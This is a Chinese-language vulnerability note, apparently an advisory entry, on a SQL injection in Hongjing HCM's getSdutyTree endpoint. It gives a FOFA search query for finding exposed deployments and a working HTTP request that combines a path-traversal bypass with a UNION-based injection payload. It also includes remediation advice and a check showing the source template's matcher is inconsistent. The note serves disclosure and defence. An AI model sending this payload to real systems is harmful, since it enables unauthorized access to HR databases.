---
source: "https://github.com/Co5mos/nuclei-tps/blob/5bc8b820acf9c992602cc7566e205e6cf1c463dd/http/vulnerabilities/hjsoft/hjsoft-hcm-getsdutytree-sqli.yaml"
fofa: "app=\"HJSOFT-HCM\""
version: "未知"
---

# 宏景HCM getSdutyTree SQL注入漏洞

## 漏洞描述

公开模板记录宏景 HCM 的 `getSdutyTree` SQL 注入检测，位置为 `codeitemid`，使用 UNION 查询输出由 `CHAR()` 拼接的常量。原文中的 `R4gd0ll` 标记和截断参数没有来源依据。

## 影响版本与前提

宏景 HCM/e-HR；确切受影响版本、修复版本及不同部署的鉴权条件未知。来源模板的请求未提供业务登录凭据；这不等于所有部署均可未授权利用。

## 网络测绘

```text
app="HJSOFT-HCM"
```

## 公开验证资料

以下请求摘自公开来源，主机名如有展示统一为 `example.invalid`；仅作为授权环境中的资料参考。

```http
GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2887%29%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd HTTP/1.1
```

## 判定与证据边界

来源模板的请求常量解码为 `qxjpqjwUIWcKtHqhkYslITEIKSbtxYTRxTtXpWImhWfaMqvjzq`；它的 matcher 却写为 `qxjpqjWUIWcKtHqhks`，大小写与后续字符不一致。应按原请求实际拼接的常量核对响应，并与正常请求比较；不要把该模板的布尔检测结果视为已验证结论。本次仅做字符串静态解码核对，未运行模板。

本篇仅静态核对公开资料，未对目标发包，未运行利用工具，也未完成本地复现。

## 修复建议

向厂商核对当前安装版本与可用补丁，在完成修复前限制相关接口的访问。修复对应查询的输入拼接，使用参数化查询，并限制数据库账户权限。

## 参考来源

- [公开检测模板](https://github.com/Co5mos/nuclei-tps/blob/5bc8b820acf9c992602cc7566e205e6cf1c463dd/http/vulnerabilities/hjsoft/hjsoft-hcm-getsdutytree-sqli.yaml)
